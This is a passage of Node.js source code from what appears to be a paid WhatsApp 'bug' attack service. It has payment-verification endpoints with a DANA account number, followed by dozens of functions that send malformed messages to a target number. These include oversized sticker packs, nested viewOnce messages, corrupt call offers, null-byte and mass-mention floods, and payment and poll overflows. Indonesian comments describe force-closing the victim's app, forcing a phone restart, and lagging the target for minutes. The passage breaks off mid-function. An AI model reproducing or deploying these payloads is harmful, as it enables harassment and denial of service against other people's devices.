  if (!plan || planCode === 'free') {
    return res.status(400).json({ valid: false, message: 'Paket tidak valid' });
  }

  const payments = loadManualPayments();
  const orderId = 'MAN_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6).toUpperCase();

  payments.push({
    orderId, username: keyInfo.username,
    plan: planCode, planName: plan.name, amount: plan.price,
    method: method || 'transfer',
    senderName: senderName || '',
    proofUrl: proofUrl || '',
    status: 'pending',
    createdAt: new Date().toISOString()
  });
  saveManualPayments(payments);

  console.log(`[💰 MANUAL PAY] ${keyInfo.username} → ${plan.name} | ${orderId}`);

  return res.json({
    valid: true,
    orderId,
    message: `Bukti bayar diterima. Tunggu verifikasi admin (max 1x24 jam). Order ID: ${orderId}`,
    payment_info: {
      method: 'DANA',
      accountNumber: '088706462067',
      accountName: '088706462067',           // ← GANTI nama DANA lo
      amount: plan.price,
      note: 'Transfer sesuai nominal. Screenshot bukti transfer.'
    }
  });
});

app.post('/api/email/admin/verify-payment', express.json(), (req, res) => {
  const { key, orderId, action } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || !['owner', 'dev', 'admin'].includes(admin.role)) {
    return res.status(403).json({ valid: false, message: 'Admin only' });
  }

  const payments = loadManualPayments();
  const payment = payments.find(p => p.orderId === orderId);
  if (!payment) return res.json({ valid: false, message: 'Order tidak ditemukan' });

  if (action === 'approve') {
    const plan = EMAIL_PLANS[payment.plan];
    const subs = loadEmailSubs();
    const expiredAt = new Date(Date.now() + 30 * 86400000).toISOString();
    subs[payment.username] = {
      plan: payment.plan,
      activatedAt: new Date().toISOString(),
      expiredAt, orderId,
      verifiedBy: keyInfo.username
    };
    saveEmailSubs(subs);
    payment.status = 'approved';
    payment.verifiedAt = new Date().toISOString();

    // Auto-approve akses email juga
    setEmailAccess(payment.username, 'approved', keyInfo.username);

    if (wsClients[payment.username]) {
      wsClients[payment.username].send(JSON.stringify({
        type: 'qris:paid', orderId, plan: plan.name, expiredAt,
        message: `✅ Pembayaran lo diverifikasi! Paket ${plan.name} aktif sampai ${expiredAt.slice(0,10)}`
      }));
    }
  } else if (action === 'reject') {
    payment.status = 'rejected';
    payment.verifiedAt = new Date().toISOString();
  }

  saveManualPayments(payments);
  return res.json({ valid: true, orderId, status: payment.status });
});

app.get('/api/email/manual-pay-status', (req, res) => {
  const { key, orderId } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const payments = loadManualPayments();
  const payment = payments.find(p => p.orderId === orderId && p.username === keyInfo.username);
  if (!payment) return res.json({ valid: false, message: 'Order tidak ditemukan' });
  return res.json({ valid: true, status: payment.status, orderId });
});

app.get('/api/email/admin/pending-payments', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || !['owner', 'dev', 'admin'].includes(admin.role)) {
    return res.status(403).json({ valid: false });
  }

  const payments = loadManualPayments().filter(p => p.status === 'pending');
  return res.json({ valid: true, payments });
});

console.log('[📧 EMAIL] All endpoints registered: /api/email/*');

// ══════════════════════════════════════════════════════════════
// 20 BUG FUNCTIONS — BARU (ORISINIL, TANPA WRAPPER)
// ══════════════════════════════════════════════════════════════
const genWAMessage = require('@whiskeysockets/baileys').generateWAMessageFromContent;

// ── 1. FREEZE via Sticker Pack ─────────────────────────────────
// ══════════════════════════════════════════════════════════════

// ══════════════════════════════════════════════════════════════
// SILENT KILL (NO DELETE) — Target FC, pesan tetap ada
// ══════════════════════════════════════════════════════════════
// Teknik:
// 1. Kirim payload yang trigger native parser overflow
// 2. Pesan TETAP ADA di chat target (nggak dihapus)
// 3. Pesan TETAP ADA di chat sender (nggak dihapus)
// 4. Target kudu restart HP biar WA normal
// ══════════════════════════════════════════════════════════════

async function bug_silentkill(sock, target, opts = {}) {
  const {
    rounds = 3,              // berapa kali kirim
    delay = 1500,            // jeda antar round
    useCall = true,          // pakai call offer juga
    useStickerPack = true,   // pakai sticker pack overflow
    useAlbum = true,         // pakai album infinity
    useNested = true,        // pakai nested viewOnce
    useProtocol = true       // pakai protocol corrupt
  } = opts;

  console.log(`[SILENT KILL] Start → ${target} | no-delete mode`);

  for (let r = 0; r < rounds; r++) {
    try {
      // ═══════════════════════════════════════════════════════
      // SERANGAN 1: Sticker Pack Overflow
      // ═══════════════════════════════════════════════════════
      if (useStickerPack) {
        const stickerMsg = generateWAMessageFromContent(target, {
          stickerPackMessage: {
            stickerPackId: 'sk_' + Date.now() + '_' + Math.random().toString(36).slice(2),
            name: 'ꦾ'.repeat(65000),
            publisher: 'ꦾ'.repeat(65000),
            stickers: [],
            fileLength: '999999999999999',
            fileSha256: 'G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=',
            fileEncSha256: '2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=',
            mediaKey: 'rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=',
            directPath: '/silent.enc',
            mediaKeyTimestamp: Date.now().toString()
          }
        }, {});

        // TANPA ephemeralExpiration — pesan tetap ada
        await sock.relayMessage(target, stickerMsg.message, {
          messageId: stickerMsg.key.id
        });

        console.log(`[SILENT KILL] Sticker pack sent to ${target}`);
      }

      // ═══════════════════════════════════════════════════════
      // SERANGAN 2: Album Infinity
      // ═══════════════════════════════════════════════════════
      if (useAlbum) {
        const albumMsg = generateWAMessageFromContent(target, {
          albumMessage: {
            expectedImageCount: 0x7FFFFFFF,
            expectedVideoCount: 0x7FFFFFFF
          }
        }, {});

        await sock.relayMessage(target, albumMsg.message, {
          messageId: albumMsg.key.id
        });

        console.log(`[SILENT KILL] Album infinity sent to ${target}`);
      }

      // ═══════════════════════════════════════════════════════
      // SERANGAN 3: Nested ViewOnce
      // ═══════════════════════════════════════════════════════
      if (useNested) {
        const nestedMsg = generateWAMessageFromContent(target, {
          viewOnceMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  viewOnceMessage: {
                    message: {
                      viewOnceMessage: {
                        message: {
                          viewOnceMessage: {
                            message: {
                              viewOnceMessage: {
                                message: {
                                  viewOnceMessage: {
                                    message: {
                                      viewOnceMessage: {
                                        message: {
                                          extendedTextMessage: {
                                            text: 'ꦾ'.repeat(65536)
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }, {});

        await sock.relayMessage(target, nestedMsg.message, {
          messageId: nestedMsg.key.id
        });

        console.log(`[SILENT KILL] Nested viewOnce sent to ${target}`);
      }

      // ═══════════════════════════════════════════════════════
      // SERANGAN 4: Call Offer Corrupt
      // ═══════════════════════════════════════════════════════
      if (useCall) {
        const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
        await sock.query({
          tag: 'call',
          attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
          },
          content: [{
            tag: 'offer',
            attrs: {
              'call-id': callId,
              'call-creator': sock.user.id
            },
            content: [
              { tag: 'audio', attrs: { enc: 'opus', rate: '0' } },
              { tag: 'video', attrs: { enc: 'vp8', dec: 'vp8', orientation: '0', screen_width: '0', screen_height: '0' } },
              { tag: 'net', attrs: { medium: '0' } },
              { tag: 'capability', attrs: { ver: '99' }, content: Buffer.alloc(100000, 0xFF) },
              { tag: 'destination', attrs: {}, content: Array.from({ length: 5000 }, () => ({
                tag: 'to', attrs: { jid: '0@s.whatsapp.net' }
              })) }
            ]
          }]
        }).catch(() => {});

        console.log(`[SILENT KILL] Call offer sent to ${target}`);
      }

      // ═══════════════════════════════════════════════════════
      // SERANGAN 5: Protocol Corrupt
      // ═══════════════════════════════════════════════════════
      if (useProtocol) {
        const protoMsg = generateWAMessageFromContent(target, {
          protocolMessage: {
            type: 0,
            key: {
              remoteJid: target,
              fromMe: true,
              id: '3EB0' + '\u0000'.repeat(1000)
            }
          }
        }, {});

        await sock.relayMessage(target, protoMsg.message, {
          messageId: protoMsg.key.id
        });

        console.log(`[SILENT KILL] Protocol corrupt sent to ${target}`);
      }

      console.log(`[SILENT KILL] Round ${r + 1}/${rounds} done — messages persist`);
      await sleep(delay);

    } catch (e) {
      console.log(`[SILENT KILL] Round ${r + 1} error:`, e.message);
      await sleep(delay);
    }
  }

  console.log(`[SILENT KILL] Selesai | Pesan tetap ada di chat`);
  return { success: true, rounds };
}

// ── 2. BLANK FORCE ─────────────────────────────────────────────
async function bug_blank(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      extendedTextMessage: {
        text: '\u0000'.repeat(50000),
        matchedText: '\u0000',
        description: '\u0000'.repeat(50000),
        title: '\u0000'.repeat(50000),
        previewType: 'NONE',
        jpegThumbnail: null
      }
    }, {});
    await sleep(200);
  }
}

// ── 3. CAROUSEL DEATH ──────────────────────────────────────────
// ══════════════════════════════════════════════════════════════
// DELAY NO CRASH — Target delay lama, dijamin nggak FC
// ══════════════════════════════════════════════════════════════
// Teknik:
// 1. Foto ukuran sedang (10-20MB) — di bawah FC threshold
// 2. Caption sedang (30-50K) — aman
// 3. Mention sedikit (500-2000) — aman
// 4. Nggak ada quoted (yang bikin render 2x)
// 5. Nggak ada EXIF corrupt
// 6. Nggak ada external ad reply (yang bikin timeout)
// Effect: worker thread target sibuk 5-15 menit, no FC
// ══════════════════════════════════════════════════════════════

async function bug_Enigma(sock, target, opts = {}) {
  const {
    // Foto — di bawah FC threshold
    photoSizeKB = 15000,      // 15MB — cukup berat, aman
    thumbnailKB = 200,        // thumbnail kecil
    useJpegThumbnail = true,

    // Caption — sedang
    captionSize = 40000,      // 40K char
    useRtlCaption = false,    // matiin RTL override

    // Mention — sedikit
    useMention = true,
    mentionCount = 1000,      // 1K mention — aman

    // Quoted — matiin (ini yang bikin render 2x)
    useQuoted = false,

    // Context — normal
    forwardingScore = 10      // score kecil, nggak suspicious
  } = opts;

  console.log(`[DELAY NOC] Start → ${target}`);
  console.log(`[DELAY NOC] Config: ${photoSizeKB}KB foto, ${captionSize} char caption, ${mentionCount} mention`);

  // ═══════════════════════════════════════════════════════════
  // GENERATE FOTO VALID UKURAN SEDANG
  // ═══════════════════════════════════════════════════════════
  function generateJpeg(sizeKB) {
    const baseJpeg = Buffer.from([
      0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00,
      0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
      0xFF, 0xDB, 0x00, 0x43, 0x00,
      ...Array(64).fill(0x10),
      0xFF, 0xC0, 0x00, 0x11, 0x08, 0x00, 0x10, 0x00, 0x10,
      0x03, 0x01, 0x11, 0x00, 0x02, 0x11, 0x01, 0x03, 0x11, 0x01,
      0xFF, 0xC4, 0x00, 0x1F, 0x00,
      ...Array(28).fill(0x00),
      0xFF, 0xDA, 0x00, 0x0C, 0x03, 0x01, 0x00, 0x02, 0x11, 0x03, 0x11, 0x00, 0x3F, 0x00,
      ...Array(100).fill(0x00),
      0xFF, 0xD9
    ]);

    const targetSize = sizeKB * 1024;
    if (baseJpeg.length >= targetSize) return baseJpeg;

    const paddingSize = targetSize - baseJpeg.length - 4;
    const padding = Buffer.alloc(paddingSize, 0x41);

    const comHeader = Buffer.from([
      0xFF, 0xFE,
      ((paddingSize + 2) >> 8) & 0xFF,
      (paddingSize + 2) & 0xFF
    ]);

    const eoiIndex = baseJpeg.length - 2;
    return Buffer.concat([
      baseJpeg.slice(0, eoiIndex),
      comHeader,
      padding,
      baseJpeg.slice(eoiIndex)
    ]);
  }

  // ═══════════════════════════════════════════════════════════
  // GENERATE CAPTION SEDANG
  // ═══════════════════════════════════════════════════════════
  let caption = 'ꦾ'.repeat(captionSize);
  if (useRtlCaption) {
    caption = '\u202E\u202D\u200B'.repeat(Math.floor(captionSize / 3)) + caption;
  }

  // ═══════════════════════════════════════════════════════════
  // GENERATE MENTION SEDIKIT
  // ═══════════════════════════════════════════════════════════
  const mentionedJids = useMention
    ? Array.from({ length: mentionCount }, () =>
        Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
      )
    : undefined;

  // ═══════════════════════════════════════════════════════════
  // GENERATE QUOTED (OPSIONAL, DEFAULT OFF)
  // ═══════════════════════════════════════════════════════════
  const quotedMessage = useQuoted
    ? {
        extendedTextMessage: {
          text: 'ꦾ'.repeat(20000),
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true
          }
        }
      }
    : undefined;

  // ═══════════════════════════════════════════════════════════
  // GENERATE FOTO + THUMBNAIL
  // ═══════════════════════════════════════════════════════════
  const bigJpeg = generateJpeg(photoSizeKB);
  const thumbnailJpeg = useJpegThumbnail ? generateJpeg(thumbnailKB) : undefined;

  console.log(`[DELAY NOC] Foto: ${(bigJpeg.length / 1024 / 1024).toFixed(2)}MB`);
  console.log(`[DELAY NOC] Thumbnail: ${thumbnailJpeg ? (thumbnailJpeg.length / 1024).toFixed(0) + 'KB' : 'none'}`);
  console.log(`[DELAY NOC] Caption: ${caption.length} char`);
  console.log(`[DELAY NOC] Mention: ${mentionedJids ? mentionedJids.length : 0} JID`);

  // ═══════════════════════════════════════════════════════════
  // BUILD IMAGE MESSAGE — KONFIGURASI AMAN
  // ═══════════════════════════════════════════════════════════
  const imageMessage = {
    url: 'https://mmg.whatsapp.net/delaynoc.enc',
    mimetype: 'image/jpeg',
    fileSha256: crypto.randomBytes(32).toString('base64'),
    fileLength: String(bigJpeg.length),
    height: 1080,
    width: 1080,
    mediaKey: crypto.randomBytes(32).toString('base64'),
    fileEncSha256: crypto.randomBytes(32).toString('base64'),
    directPath: '/delaynoc.enc',
    mediaKeyTimestamp: String(Date.now()),
    caption: caption,
    jpegThumbnail: thumbnailJpeg
  };

  // Context info — versi minimal, nggak bikin FC
  const contextInfo = {
    forwardingScore: forwardingScore,
    isForwarded: true,
    mentionedJid: mentionedJids,
    quotedMessage: quotedMessage
  };

  imageMessage.contextInfo = contextInfo;

  // ═══════════════════════════════════════════════════════════
  // KIRIM
  // ═══════════════════════════════════════════════════════════
  try {
    const msg = generateWAMessageFromContent(target, {
      imageMessage: imageMessage
    }, {});

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    console.log(`[DELAY NOC] ✅ Foto terkirim ke ${target}`);
    console.log(`[DELAY NOC] Target delay 5-15 menit, no FC`);

    return {
      success: true,
      photoSize: bigJpeg.length,
      captionSize: caption.length,
      mentionCount: mentionedJids ? mentionedJids.length : 0
    };

  } catch (e) {
    console.error(`[DELAY NOC] Error:`, e.message);
    return { success: false, error: e.message };
  }
}

// ── 4. ALBUM INFINITY ──────────────────────────────────────────
async function bug_album(sock, target) {
  const album = await genWAMessage(target, {
    albumMessage: { expectedImageCount: 99999999, expectedVideoCount: 99999999 }
  }, {});

  await sock.relayMessage(target, album.message, { messageId: album.key.id });
}

// ── 5. PROTOCOL CORRUPT ────────────────────────────────────────
async function bug_protocol(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      protocolMessage: {
        type: 0,
        key: {
          remoteJid: target,
          fromMe: true,
          id: '3EB0' + '\u0000'.repeat(500)
        }
      }
    }, {});
    await sleep(200);
  }
}

// ── 6. PAYMENT CORRUPT ─────────────────────────────────────────
async function bug_payment(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage(target, {
      requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        amount1000: 999999999999,
        requestFrom: target,
        noteMessage: {
          extendedTextMessage: { text: '\u0000'.repeat(2000000) }
        },
        expiryTimestamp: 99999999999999,
        amount: { offset: 0, value: 999999999, currencyCode: 'IDR' }
      }
    }, {});
    await sleep(300);
  }
}

// ── 7. INTERACTIVE OVERFLOW ────────────────────────────────────
async function bug_interactive(sock, target) {
  for (let i = 0; i < 5; i++) {
    const msg = genWAMessage(target, {
      interactiveMessage: {
        body: { text: 'ꦾ'.repeat(50000) },
        nativeFlowMessage: {
          buttons: Array.from({ length: 5000 }, (_, j) => ({
            name: 'quick_reply',
            buttonParamsJson: JSON.stringify({
              display_text: 'ꦾ'.repeat(5000),
              id: 'btn_' + j
            })
          })),
          messageParamsJson: '\u0000'.repeat(1000000)
        }
      }
    }, {});

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    await sleep(500);
  }
}

// ── 8. STICKER NULL ────────────────────────────────────────────
async function bug_sticker(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp',
        height: 9999,
        width: 9999,
        directPath: '/o1/v/t62.7118-24/sticker.enc',
        fileLength: 999999999
      }
    }, {});
    await sleep(150);
  }
}

// ── 9. STATUS CORRUPT ──────────────────────────────────────────
async function bug_status(sock, target) {
  for (let i = 0; i < 10; i++) {
    const msg = genWAMessage(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(60000),
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, () =>
            Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
          ),
          forwardingScore: 999999,
          isForwarded: true,
          quotedMessage: { conversation: '\u0000'.repeat(500000) }
        }
      }
    }, {});

    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target } }]
        }]
      }]
    });
    await sleep(500);
  }
}

// ── 10. CALL CORRUPT ───────────────────────────────────────────
async function bug_call(sock, target) {
  for (let i = 0; i < 5; i++) {
    const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);

    const stanza = {
      tag: 'call',
      attrs: {
        to: target,
        id: sock.generateMessageTag(),
        from: sock.user.id
      },
      content: [{
        tag: 'offer',
        attrs: { 'call-id': callId, 'call-creator': sock.user.id },
        content: [
          { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
          { tag: 'net', attrs: { medium: '3' } },
          { tag: 'capability', attrs: { ver: '1' }, content: Buffer.from([1, 5, 247, 9, 228, 250, 1]) },
          { tag: 'encopt', attrs: { keygen: '2' } }
        ]
      }]
    };

    await sock.query(stanza).catch(() => {});
    await sleep(1000);
  }
}

// ── 11. NEWSLETTER FLOOD ───────────────────────────────────────
async function bug_newsletter(sock, target) {
  for (let i = 0; i < 5; i++) {
    const msg = genWAMessage(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(50000),
        contextInfo: {
          forwardedNewsletterMessageInfo: {
            newsletterName: 'ꦾ'.repeat(50000),
            newsletterJid: '1@newsletter',
            serverMessageId: 1
          },
          forwardingScore: 999999,
          isForwarded: true
        }
      }
    }, {});

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    await sleep(500);
  }
}

// ── 12. MENTION MASS ───────────────────────────────────────────
async function bug_mention(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
// ── 13. POLL CORRUPT ───────────────────────────────────────────
async function bug_poll(sock, target) {
  for (let i = 0; i < 5; i++) {
    const msg = genWAMessage(target, {
      pollCreationMessage: {
        name: 'ꦾ'.repeat(50000),
        options: Array.from({ length: 200 }, (_, j) => ({
          optionName: 'ꦾ'.repeat(5000) + j
        })),
        selectableOptionsCount: 9999
      }
    }, {});

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    await sleep(500);
  }
}

// ── 14. DOCUMENT NULL ──────────────────────────────────────────
async function bug_doc(sock, target) {
  for (let i = 0; i < 5; i++) {
    await sock.relayMessage(target, {
      documentMessage: {
        url: 'https://mmg.whatsapp.net/v/t62.7119-24/null.enc',
        mimetype: 'application/pdf',
        fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
        fileLength: '99999999999999',
        pageCount: 9999999999,
        mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
        fileName: '\u0000'.repeat(50000),
        fileEncSha256: 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
        directPath: '/v/t62.7119-24/null.enc'
      }
    }, {});
    await sleep(300);
  }
}

// ── 15. LOCATION NULL ──────────────────────────────────────────
async function bug_location(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 999999,
        degreesLongitude: 999999,
        name: 'ꦾ'.repeat(60000),
        address: '\u0000'.repeat(60000),
        url: 'https://null.null/' + 'ꦾ'.repeat(50000)
      }
    }, {});
    await sleep(300);
  }
}

// ── 16. REACTION SPAM ──────────────────────────────────────────
async function bug_reaction(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.relayMessage(target, {
      reactionMessage: {
        key: {
          remoteJid: target,
          fromMe: false,
          id: '3EB0' + crypto.randomBytes(8).toString('hex')
        },
        text: 'ꦾ'.repeat(5000)
      }
    }, {}).catch(() => {});
    await sleep(200);
  }
}

// ── 17. RECEIPT CORRUPT ────────────────────────────────────────
async function bug_receipt(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      receiptMessage: {
        type: 'sender',
        timestamp: 99999999999999,
        key: {
          remoteJid: target,
          fromMe: false,
          id: '3EB0' + '\u0000'.repeat(100)
        }
      }
    }, {}).catch(() => {});
    await sleep(200);
  }
}

// ── 18. BUTTON CORRUPT ─────────────────────────────────────────
async function bug_button(sock, target) {
  for (let i = 0; i < 5; i++) {
    const msg = genWAMessage(target, {
      buttonsMessage: {
        contentText: 'ꦾ'.repeat(50000),
        footerText: 'ꦾ'.repeat(50000),
        headerType: 1,
        buttons: Array.from({ length: 1000 }, (_, j) => ({
          buttonId: 'btn_' + j + '\u0000'.repeat(100),
          buttonText: { displayText: 'ꦾ'.repeat(5000) },
          type: 1
        }))
      }
    }, {});

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    await sleep(500);
  }
}

// ── 19. NESTED MESSAGE ─────────────────────────────────────────
async function bug_nested(sock, target) {
  for (let i = 0; i < 5; i++) {
    const msg = genWAMessage(target, {
      viewOnceMessage: {
        message: {
          viewOnceMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  viewOnceMessage: {
                    message: {
                      extendedTextMessage: {
                        text: '\u0000'.repeat(500000),
                        contextInfo: {
                          mentionedJid: Array.from({ length: 5000 }, () =>
                            Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
                          )
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    await sleep(500);
  }
}

// ── 20. COMBO ALL ──────────────────────────────────────────────
async function bug_combo(sock, target) {
  for (let r = 0; r < 3; r++) {
    const album = await genWAMessage(target, {
      albumMessage: { expectedImageCount: 99999999, expectedVideoCount: 99999999 }
    }, {});
    await sock.relayMessage(target, album.message, { messageId: album.key.id }).catch(() => {});

    const carousel = genWAMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: 'ꦾ'.repeat(50000) },
            carouselMessage: {
              cards: Array.from({ length: 50 }, () => ({
                header: { hasMediaAttachment: false, title: '\u2060'.repeat(3000) },
                body: { text: 'ꦾ'.repeat(5000) },
                nativeFlowMessage: { messageParamsJson: '\u0000'.repeat(5000) }
              }))
            }
          }
        }
      }
    }, {});
    await sock.relayMessage(target, carousel.message, { messageId: carousel.key.id }).catch(() => {});

    await sock.relayMessage(target, {
      protocolMessage: {
        type: 0,
        key: { remoteJid: target, fromMe: true, id: '3EB0' + '\u0000'.repeat(500) }
      }
    }, {}).catch(() => {});

    await sock.relayMessage(target, {
      requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        amount1000: 999999999999,
        requestFrom: target,
        noteMessage: { extendedTextMessage: { text: '\u0000'.repeat(1000000) } },
        expiryTimestamp: 99999999999999,
        amount: { offset: 0, value: 999999999, currencyCode: 'IDR' }
      }
    }, {}).catch(() => {});

    await sleep(1000);
  }
}

// ══════════════════════════════════════════════════════════════
// 100 BUG TAMBAHAN — FREEZE / BLANK / CRASH / LAG / SPAM
// KILL / CAROUSEL / STICKER / CALL / PAYLOAD
// ══════════════════════════════════════════════════════════════

// ─── FREEZE 1: Native Flow Overflow ────────────────────────────
async function bug_freeze1(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(50000) },
      nativeFlowMessage: {
        buttons: Array.from({ length: 2000 }, (_, i) => ({
          name: 'quick_reply',
          buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(3000), id: 'f1_' + i })
        })),
        messageParamsJson: '\u0000'.repeat(500000)
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── FREEZE 2: Carousel Chain ──────────────────────────────────
async function bug_freeze2(sock, target) {
  const msg = genWAMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: 'ꦾ'.repeat(30000) },
          carouselMessage: {
            cards: Array.from({ length: 80 }, () => ({
              header: { hasMediaAttachment: false, title: '\u2060'.repeat(3000) },
              body: { text: 'ꦾ'.repeat(8000) },
              nativeFlowMessage: {
                buttons: Array.from({ length: 50 }, (_, j) => ({
                  name: 'cta_url',
                  buttonParamsJson: JSON.stringify({
                    display_text: 'ꦾ'.repeat(2000),
                    url: 'https://x.com/' + 'ꦾ'.repeat(2000) + j
                  })
                })),
                messageParamsJson: '\u0000'.repeat(100000)
              }
            })),
            messageVersion: 1
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── FREEZE 3: Payment Stack ───────────────────────────────────
async function bug_freeze3(sock, target) {
  for (let i = 0; i < 8; i++) {
    await sock.relayMessage(target, {
      requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        amount1000: 999999999999,
        requestFrom: target,
        noteMessage: {
          extendedTextMessage: {
            text: '\u0000'.repeat(500000),
            contextInfo: {
              mentionedJid: Array.from({ length: 3000 }, () =>
                Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
              )
            }
          }
        },
        expiryTimestamp: 99999999999999,
        amount: { offset: 0, value: 999999999, currencyCode: 'IDR' }
      }
    }, {}).catch(() => {});
    await sleep(200);
  }
}

// ─── FREEZE 4: Button Flood ────────────────────────────────────
async function bug_freeze4(sock, target) {
  const msg = genWAMessage(target, {
    buttonsMessage: {
      contentText: 'ꦾ'.repeat(50000),
      footerText: 'ꦾ'.repeat(50000),
      headerType: 1,
      buttons: Array.from({ length: 3000 }, (_, j) => ({
        buttonId: 'f4_' + j,
        buttonText: { displayText: 'ꦾ'.repeat(5000) },
        type: 1
      }))
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── FREEZE 5: Poll Overflow ───────────────────────────────────
async function bug_freeze5(sock, target) {
  const msg = genWAMessage(target, {
    pollCreationMessage: {
      name: 'ꦾ'.repeat(50000),
